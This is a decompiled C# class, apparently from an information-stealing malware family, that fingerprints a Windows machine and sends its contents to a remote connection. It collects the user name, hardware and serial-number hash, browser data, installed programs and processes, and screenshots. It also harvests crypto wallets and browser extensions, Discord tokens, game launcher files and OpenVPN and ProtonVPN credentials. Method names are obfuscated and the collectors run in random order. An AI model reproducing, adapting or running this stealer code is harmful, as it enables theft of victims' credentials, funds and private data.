using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200000C RID: 12
public class PartsSender : EntityResolver
{
	// Token: 0x06000048 RID: 72 RVA: 0x00004C68 File Offset: 0x00003068
	public PartsSender()
	{
		EntityResolver.Main = new Enter[]
		{
			new Enter(PartsSender.asdk9345asd),
			new Enter(PartsSender.asdk8jasd),
			new Enter(PartsSender.ылв92р34выа),
			new Enter(PartsSender.аловй),
			new Enter(PartsSender.ыал8р45),
			new Enter(PartsSender.ываш9р34),
			new Enter(PartsSender.ывал8н34),
			new Enter(PartsSender.вал93тфыв),
			new Enter(PartsSender.вашу0л34),
			new Enter(PartsSender.навева),
			new Enter(PartsSender.ащы9р34),
			new Enter(PartsSender.ыва83о4тфыв),
			new Enter(PartsSender.askd435),
			new Enter(PartsSender.asdasod9234oasd),
			new Enter(PartsSender.длвап9345)
		};
		EntityResolver.First = new Enter[]
		{
			new Enter(PartsSender.sdf934asd),
			new Enter(PartsSender.asd44123),
			new Enter(PartsSender.sdfi35sdf),
			new Enter(PartsSender.sdfo8n234),
			new Enter(PartsSender.asdkadu8),
			new Enter(PartsSender.fdfg9i3jn4)
		};
		Random rnd = new Random();
		EntityResolver.Main = (from x in EntityResolver.Main
		orderby rnd.Next()
		select x).ToArray<Enter>();
		EntityResolver.First = (from x in EntityResolver.First
		orderby rnd.Next()
		select x).ToArray<Enter>();
	}

	// Token: 0x06000049 RID: 73 RVA: 0x00004E2C File Offset: 0x0000322C
	public override bool Invoker(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		return PartsSender.sdf9j3nasd(connection, settings, ref result);
	}

	// Token: 0x0600004A RID: 74 RVA: 0x00004E48 File Offset: 0x00003248
	public static bool sdf9j3nasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool result2;
		try
		{
			result.Id7 = new Entity1
			{
				Id2 = new List<string>(),
				Id6 = new List<Entity9>(),
				Id7 = new List<Entity12>(),
				Id16 = new List<Entity5>(),
				Id10 = new List<Entity5>(),
				Id8 = new List<Entity4>(),
				Id15 = new List<Entity5>(),
				Id12 = new List<Entity12>(),
				Id13 = new List<Entity5>(),
				Id4 = new List<string>(),
				Id14 = new List<Entity5>(),
				Id9 = new List<Entity5>(),
				Id11 = new List<Entity5>(),
				Id1 = new List<string>(),
				Id3 = new List<string>(),
				Id5 = new List<Entity3>()
			};
			result.Id11 = IPv4Helper.GetDefaultIPv4Address();
			result.Id15 = PartsSender.Visible();
			result.PreCheck();
			foreach (Enter enter in EntityResolver.First)
			{
				try
				{
					enter(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			Entity13 entity = connection.Id6(result);
			bool flag = entity != Entity13.Id2;
			if (flag)
			{
				throw new InvalidOperationException();
			}
			PartsSender.LSIDsd2(connection, settings, ref result);
			while (!connection.Id25())
			{
				bool flag2 = !connection.Id3();
				if (flag2)
				{
					Thread.Sleep(1000);
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex2)
		{
			throw ex2;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600004B RID: 75 RVA: 0x0000504C File Offset: 0x0000344C
	public static bool Visible()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
			bool flag = Directory.Exists(path);
			if (!flag)
			{
				Directory.CreateDirectory(path);
				return false;
			}
			bool flag2 = new DirectoryInfo(path).CreationTime < DateTime.Now.AddMonths(-3);
			if (flag2)
			{
				Directory.Delete(path);
				Directory.CreateDirectory(path);
				return false;
			}
			return true;
		}
		catch
		{
		}
		return false;
	}

	// Token: 0x0600004C RID: 76 RVA: 0x000050E0 File Offset: 0x000034E0
	public static bool LSIDsd2(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool result2;
		try
		{
			foreach (Enter enter in EntityResolver.Main)
			{
				try
				{
					enter(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception ex2)
				{
				}
			}
			result2 = true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600004D RID: 77 RVA: 0x0000516C File Offset: 0x0000356C
	public static void asdkadu8(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id1 = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	// Token: 0x0600004E RID: 78 RVA: 0x0000519E File Offset: 0x0000359E
	public static void sdfo8n234(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id14 = Assembly.GetExecutingAssembly().Location;
	}

	// Token: 0x0600004F RID: 79 RVA: 0x000051B2 File Offset: 0x000035B2
	public static void sdfi35sdf(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id5 = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.Id4 = SystemInfoHelper.GetWindowsVersion();
	}

	// Token: 0x06000050 RID: 80 RVA: 0x000051D8 File Offset: 0x000035D8
	public static void asd44123(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id6 = GdiHelper.GetVirtualDisplaySize().ToString();
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00005200 File Offset: 0x00003600
	public static void fdfg9i3jn4(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id10 = TimeZoneInfo.Local.DisplayName;
	}

	// Token: 0x06000052 RID: 82 RVA: 0x00005214 File Offset: 0x00003614
	public static void sdf934asd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		result.Id3 = Environment.UserName;
	}

	// Token: 0x06000053 RID: 83 RVA: 0x00005224 File Offset: 0x00003624
	public static void asdk9345asd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		List<Entity3> list = new List<Entity3>();
		foreach (Entity3 item in SystemInfoHelper.GetProcessors())
		{
			list.Add(item);
		}
		foreach (Entity3 item2 in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(item2);
		}
		list.Add(new Entity3
		{
			Id1 = new string(new char[]
			{
				'T',
				'o',
				't',
				'a',
				'l',
				' ',
				'o',
				'f',
				' ',
				'R',
				'A',
				'M'
			}),
			Id3 = Entity14.Id2,
			Id2 = SystemInfoHelper.CollectMemory()
		});
		Entity13 entity = connection.Id13(list);
		bool flag = entity == Entity13.Id3;
		if (flag)
		{
			PartsSender.asdk9345asd(connection, settings, ref result);
		}
		bool flag2 = entity == Entity13.Id4;
		if (flag2)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000054 RID: 84 RVA: 0x00005340 File Offset: 0x00003740
	public static void asdk8jasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 entity = connection.Id14(SystemInfoHelper.GetBrowsers());
		bool flag = entity == Entity13.Id3;
		if (flag)
		{
			PartsSender.asdk8jasd(connection, settings, ref result);
		}
		bool flag2 = entity == Entity13.Id4;
		if (flag2)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000055 RID: 85 RVA: 0x0000537C File Offset: 0x0000377C
	public static void ылв92р34выа(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 entity = connection.Id15(SystemInfoHelper.ListOfPrograms());
		bool flag = entity == Entity13.Id3;
		if (flag)
		{
			PartsSender.ылв92р34выа(connection, settings, ref result);
		}
		bool flag2 = entity == Entity13.Id4;
		if (flag2)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000056 RID: 86 RVA: 0x000053B8 File Offset: 0x000037B8
	public static void аловй(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		List<string> vs = SystemInfoHelper.GetVs();
		Entity13 entity = connection.Id10((vs != null) ? vs.ToList<string>() : null);
		bool flag = entity == Entity13.Id3;
		if (flag)
		{
			PartsSender.аловй(connection, settings, ref result);
		}
		bool flag2 = entity == Entity13.Id4;
		if (flag2)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000057 RID: 87 RVA: 0x00005400 File Offset: 0x00003800
	public static void ыал8р45(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 entity = connection.Id20(SystemInfoHelper.ListOfProcesses());
		bool flag = entity == Entity13.Id3;
		if (flag)
		{
			PartsSender.ыал8р45(connection, settings, ref result);
		}
		bool flag2 = entity == Entity13.Id4;
		if (flag2)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000058 RID: 88 RVA: 0x0000543C File Offset: 0x0000383C
	public static void ываш9р34(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 entity = connection.Id16(SystemInfoHelper.AvailableLanguages());
		bool flag = entity == Entity13.Id3;
		if (flag)
		{
			PartsSender.ываш9р34(connection, settings, ref result);
		}
		bool flag2 = entity == Entity13.Id4;
		if (flag2)
		{
			throw new InvalidOperationException();
		}
	}

	// Token: 0x06000059 RID: 89 RVA: 0x00005478 File Offset: 0x00003878
	public static void длвап9345(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id5;
		if (id)
		{
			Entity13 entity = connection.Id7(GdiHelper.GetImageBase());
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.длвап9345(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600005A RID: 90 RVA: 0x000054C0 File Offset: 0x000038C0
	public static void ывал8н34(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id6;
		if (id)
		{
			List<Entity5> result2 = FileScanning.Search(new Extractor[]
			{
				new RosComNadzor()
			});
			Entity13 entity = connection.Id24(result2);
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.ывал8н34(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600005B RID: 91 RVA: 0x0000551C File Offset: 0x0000391C
	public static void вал93тфыв(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id1;
		if (id)
		{
			List<Entity9> list = new List<Entity9>();
			list.AddRange(Entity18.Id1(settings.Id11));
			list.AddRange(Entity20.Id1(settings.Id12));
			Entity13 entity = connection.Id8(list);
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.вал93тфыв(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600005C RID: 92 RVA: 0x0000558C File Offset: 0x0000398C
	public static void вашу0л34(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id2;
		if (id)
		{
			Entity13 entity = connection.Id22(FileSearcher.Search(settings.Id10));
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.вашу0л34(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600005D RID: 93 RVA: 0x000055DC File Offset: 0x000039DC
	public static void навева(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id3;
		if (id)
		{
			Entity13 entity = connection.Id12(Entity19.Id1());
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.навева(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600005E RID: 94 RVA: 0x00005624 File Offset: 0x00003A24
	public static void ащы9р34(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id4;
		if (id)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.Id11);
			List<Entity5> list = FileScanning.Search(new Extractor[]
			{
				new AllWallets(),
				brEx
			});
			list.AddRange(ConfigReader.Read(settings.Id13));
			Entity13 entity = connection.Id9(list);
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.ащы9р34(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x0600005F RID: 95 RVA: 0x000056AC File Offset: 0x00003AAC
	public static void ыва83о4тфыв(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id9;
		if (id)
		{
			IEnumerable<Entity5> tokens = Discord.GetTokens();
			Entity13 entity = connection.Id11((tokens != null) ? tokens.ToList<Entity5>() : null);
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.ыва83о4тфыв(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00005700 File Offset: 0x00003B00
	public static void askd435(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id8;
		if (id)
		{
			Entity13 entity = connection.Id23(FileScanning.Search(new Extractor[]
			{
				new GameLauncher()
			}));
			bool flag = entity == Entity13.Id3;
			if (flag)
			{
				PartsSender.askd435(connection, settings, ref result);
			}
			bool flag2 = entity == Entity13.Id4;
			if (flag2)
			{
				throw new InvalidOperationException();
			}
		}
	}

	// Token: 0x06000061 RID: 97 RVA: 0x00005758 File Offset: 0x00003B58
	public static void asdasod9234oasd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
	{
		bool id = settings.Id7;
		if (id)
		{
			connection.Id18(Entity21.Id1());
			connection.Id19(FileScanning.Search(new Extractor[]
			{
				new OpenVPN()
			}));
			connection.Id21(FileScanning.Search(new Extractor[]
			{
				new РrоtoнVРN()
			}));
		}
	}
}
